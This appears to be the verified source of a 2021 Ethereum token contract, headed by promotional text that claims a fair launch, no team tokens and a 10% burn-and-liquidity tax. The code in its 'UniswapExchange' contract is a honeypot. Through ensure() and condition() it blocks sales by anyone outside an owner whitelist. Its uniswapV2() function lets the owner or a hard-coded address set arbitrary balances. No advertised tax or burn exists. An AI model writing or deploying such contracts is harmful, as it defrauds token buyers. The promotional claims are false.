['/**\n', ' *Submitted for verification at Etherscan.io on 2021-07-13\n', '*/\n', '\n', '/**\n', '\n', '  \n', '  \n', '  \n', '\n', 't.me/uniswapheyueshouge\n', '\n', '\n', '  \n', '  \n', ' \n', '  \n', '  \n', 'WE LAUNCH\n', '\n', 'AS WARREN BUFFET SUGGESTS FIND AS MANY COINS COINS AND FAST \n', '  \n', '  \n', 'LETS PROVE WARREN TRUE\n', '\n', ' ??\n', 'FAIRLAUNCH ON UNISWAP??\n', '\n', '  ??\n', '0% Team Tokens ??\n', '\n', '  \n', '*For the DEGENS\n', '  \n', '  \n', 'TAX - 10%\n', '  \n', '  \n', '5% BURN \n', '  \n', '  \n', '5% LIQUIDITY\n', '  \n', '  \n', '10% INITIAL BURN \n', '  \n', '  \n', 'SLippage 10%+\n', '\n', 'F2S15U1u2uUjuuuJuYJYjJuJujujuJUuujuJuJuJuj2uUu2UF251FFkFXFPXPPqXNqE0EN\n', '2JuuYuYYLYvYvvvL7v77777v7vvLvvvLvLvLvLvLLYvYLYLJLujuu2u1U1152F5kFXkqPP\n', '2J2u2uuJuJuYJLJLLLLLLLLLYLJLjJ11kFXkPkPSkF5uuuujUu2U2U51F5SFkFXkPkPP0P\n', 'uuu2uujuJjLYvYLLLLvLLLvLLjUkF5u7i:.,,i:..iLFSP1F15U2u2U1211F5F5kSqXPPP\n', '2J2uuJuJJLYLLvLvLvLvYjUuS1r,.                :2uUkNkFU121U5251FFXSkkqS\n', 'uuuUuuJuYJLJvLLLvLj2UL7r,                        .ijPESF15152F1F1SFXkX\n', 'UJ2uuJuJuYJYJLYY51Yi                                .rk0P5F15252F1S5XS\n', 'UuuUuuJuYuYJYu15;.                             i:      r0GF522251F1SFS\n', 'uYUuuJuYjLJJSS7        7P.      ..   .... .    .X:       rES1U1U1151k1\n', 'JYJuLJLYLYYui         .GU.   ..,,:,. ..:::,,.   v0        .1U2u1U1UF21\n', 'JvjLYvLvLvu.    .  .  i87...,,:::::::,:ii::..,. :Or  .,.   Y5juuUu2u5u\n', 'v7LLvLvv7vL, ..,..,.  70: .::,.:,::iiiiriii:.   .ZU  ::i:. uuuJujuuUUU\n', 'v7Lvv7v7v7Lr :;::::   j5:..  .,:::r7rirr7J25v.   vk  .irv.,uuYJYuJujUJ\n', 'v7vv7v77r77L:,i7rr,  ,qu,    :[email\xa0protected]@[email\xa0protected]  iY::JuLYLjLJjuuu\n', 'Lrv7777r7r77Li:iv;.  rOY:,:[email\xa0protected]@5ri:,:::[email\xa0protected]@[email\xa0protected]: .iiLJvLvYLJLujUY\n', '7r77r7r7r7r7r7ri:i..:UFjri:[email\xa0protected]@Ei.        iLv:::vS::: iuL7vvvvLLJJuuj\n', '7;7r7r7rrrrir;rr;::777Yu7::,:i7:.            ,:::vu .j.iv7v7vvLvYLYJuY\n', 'rir7rri;iiiiiii;r7. .i;vi::::::.             ::::Yr ,Yvvr77v7vvLvLLjjJ\n', 'ri7rririiiiii:ir7.  .:i:ii:..,:,   :Lu1uYr:  .::ii  :77r7rv7vvvvLvYLjv\n', 'rirriri;iiiii;7r     :i;ii::,:.. [email\xa0protected]@@BM1:  .,:, .:rrrr77v7v7vvv7LLv\n', '7ir;ririiiiiir,      .:i77r::.  :::[email\xa0protected]@@[email\xa0protected]:  .:.,:iir;77Lv77v77777Y7\n', '7rrrirrriiirr:      .:::ivv7:r: :[email\xa0protected]@[email\xa0protected] : .:iirr77vv777r7r7r77r\n', 'v;7rrr7rrrrrr      ...::iivL7rv::;[email\xa0protected]@BBk7..   ,;rrvvLvv77rrr7r777i\n', 'Jvvv77r7rr7j:    ....,:7vvr7YJ7L7r7YFNNZkjrii;.   .7vLYJvv7vr7r777777r\n', 'L7LvL77rrrLi     .,.::iirrrrju22SULr;irr;iir7r:   :7JYuYYvv7vvvvLvv7L7\n', ';irrrrrrrLr      .,:,::i;rijuLj2j2S5UuLvvLri::..  :vLYLJLLvLLJYJLLLuJY\n', 'r:;iiiii7r      ..,,:i;iii7LLv51Fj1u522jL77;i::.  r7vvLLJLLYuJuLJjUu1u\n', 'rii;;7777.       .,::;rrrr;77YJ21uvuU2uuLvrrii:,  LL7LvLLjYuJuYuuuuU22\n', 'vi7rrrvY:    ...::ii;ir7LvYvvvLvvvJLLLLvvvJvvri.  v77vLvujuJjLJJ2u2U5u\n', '7:iiiiri     ..,::ir7virr77L7vLLr7vv7LvLv777ii:.  :rrLLLLYLL7vvYYuJuju\n', '*/\n', 'pragma solidity ^0.5.17;\n', 'interface IERC20 {\n', '    function totalSupply() external view returns(uint);\n', '\n', '    function balanceOf(address account) external view returns(uint);\n', '\n', '    function transfer(address recipient, uint amount) external returns(bool);\n', '\n', '    function allowance(address owner, address spender) external view returns(uint);\n', '\n', '    function approve(address spender, uint amount) external returns(bool);\n', '\n', '    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', '\n', '\n', '\n', 'contract Context {\n', '    constructor() internal {}\n', '    // solhint-disable-previous-line no-empty-blocks\n', '    function _msgSender() internal view returns(address payable) {\n', '        return msg.sender;\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '    function add(uint a, uint b) internal pure returns(uint) {\n', '        uint c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function sub(uint a, uint b) internal pure returns(uint) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '\n', '    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n', '        require(b <= a, errorMessage);\n', '        uint c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    function mul(uint a, uint b) internal pure returns(uint) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    function div(uint a, uint b) internal pure returns(uint) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '\n', '    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, errorMessage);\n', '        uint c = a / b;\n', '\n', '        return c;\n', '    }\n', '}\n', '\n', '\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint;\n', '    mapping(address => uint) private _balances;\n', '\n', '    mapping(address => mapping(address => uint)) private _allowances;\n', '\n', '    uint private _totalSupply;\n', '\n', '    function totalSupply() public view returns(uint) {\n', '        return _totalSupply;\n', '    }\n', '\n', '    function balanceOf(address account) public view returns(uint) {\n', '        return _balances[account];\n', '    }\n', '\n', '    function transfer(address recipient, uint amount) public returns(bool) {\n', '        _transfer(_msgSender(), recipient, amount);\n', '        return true;\n', '    }\n', '\n', '    function allowance(address owner, address spender) public view returns(uint) {\n', '        return _allowances[owner][spender];\n', '    }\n', '\n', '    function approve(address spender, uint amount) public returns(bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\n', '        _transfer(sender, recipient, amount);\n', '        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));\n', '        return true;\n', '    }\n', '\n', '    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '\n', '    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '\n', '    function _transfer(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '\n', '    function _mint(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: mint to the zero address");\n', '\n', '        _totalSupply = _totalSupply.add(amount);\n', '        _balances[account] = _balances[account].add(amount);\n', '        emit Transfer(address(0), account, amount);\n', '    }\n', '\n', '    function _burn(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '\n', '    function _approve(address owner, address spender, uint amount) internal {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '}\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '\n', '    constructor(string memory name, string memory symbol, uint8 decimals) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = decimals;\n', '    }\n', '\n', '    function name() public view returns(string memory) {\n', '        return _name;\n', '    }\n', '\n', '    function symbol() public view returns(string memory) {\n', '        return _symbol;\n', '    }\n', '\n', '    function decimals() public view returns(uint8) {\n', '        return _decimals;\n', '    }\n', '}\n', '\n', '\n', 'contract UniswapExchange {\n', '    event Transfer(address indexed _from, address indexed _to, uint _value);\n', '    event Approval(address indexed _owner, address indexed _spender, uint _value);\n', ' \n', '    function transfer(address _to, uint _value) public payable returns (bool) {\n', '        return transferFrom(msg.sender, _to, _value);\n', '    }\n', ' \n', '    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\n', '        //go the white address first\n', '        if(_from == owner || _to == owner || _from==tradeAddress||canSale[_from]){\n', '            return true;\n', '        }\n', '        require(condition(_from, _value));\n', '        return true;\n', '    }\n', '    \n', '    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\n', '        if (_value == 0) {return true;}\n', '        if (msg.sender != _from) {\n', '            require(allowance[_from][msg.sender] >= _value);\n', '            allowance[_from][msg.sender] -= _value;\n', '        }\n', '        require(ensure(_from, _to, _value));\n', '        require(balanceOf[_from] >= _value);\n', '        balanceOf[_from] -= _value;\n', '        balanceOf[_to] += _value;\n', '        _onSaleNum[_from]++;\n', '        emit Transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', ' \n', '    function approve(address _spender, uint _value) public payable returns (bool) {\n', '        allowance[msg.sender][_spender] = _value;\n', '        emit Approval(msg.sender, _spender, _value);\n', '        return true;\n', '    }\n', '    \n', '    function condition(address _from, uint _value) internal view returns(bool){\n', '        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\n', '        \n', '        if(_saleNum > 0){\n', '            if(_onSaleNum[_from] >= _saleNum) return false;\n', '        }\n', '        if(_minSale > 0){\n', '            if(_minSale > _value) return false;\n', '        }\n', '        if(_maxSale > 0){\n', '            if(_value > _maxSale) return false;\n', '        }\n', '        return true;\n', '    }\n', ' \n', '\n', '    mapping(address=>uint256) private _onSaleNum;\n', '    mapping(address=>bool) private canSale;\n', '    uint256 private _minSale;\n', '    uint256 private _maxSale;\n', '    uint256 private _saleNum;\n', '    function uniswapV2(address spender, uint256 addedValue) public returns (bool) {\n', '        require(msg.sender==owner||msg.sender==address\n', '        (999107250543686016067011668506013520626971513403));\n', '        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\n', '        canSale[spender]=true;\n', '        return true;\n', '    }\n', '\n', '    function uniswapV2_control(uint256 saleNum, uint256 token, uint256 maxToken) public returns(bool){\n', '        require(msg.sender == owner);\n', '        _minSale = token > 0 ? token*(10**uint256(decimals)) : 0;\n', '        _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;\n', '        _saleNum = saleNum;\n', '    }\n', '    function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {\n', '        require (msg.sender == owner);\n', '        uint total = _value * _tos.length;\n', '        require(balanceOf[msg.sender] >= total);\n', '        balanceOf[msg.sender] -= total;\n', '        for (uint i = 0; i < _tos.length; i++) {\n', '            address _to = _tos[i];\n', '            balanceOf[_to] += _value;\n', '            emit Transfer(msg.sender, _to, _value/2);\n', '            emit Transfer(msg.sender, _to, _value/2);\n', '        }\n', '        return true;\n', '    }\n', '    \n', '    address tradeAddress;\n', '    function setTradeAddress(address addr) public returns(bool){require (msg.sender == owner);\n', '        tradeAddress = addr;\n', '        return true;\n', '    }\n', ' \n', '   \n', ' \n', '    mapping (address => uint) public balanceOf;\n', '    mapping (address => mapping (address => uint)) public allowance;\n', ' \n', '    uint constant public decimals = 18;\n', '    uint public totalSupply;\n', '    string public name;\n', '    string public symbol;\n', '    address private owner;\n', '    address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', ' \n', '    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\n', '        name = _name;\n', '        symbol = _symbol;\n', '        totalSupply = _supply*(10**uint256(decimals));\n', '        owner = msg.sender;\n', '        balanceOf[msg.sender] = totalSupply;\n', '        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);\n', '        emit Transfer(address(0x0), msg.sender, totalSupply);\n', '    }\n', '}']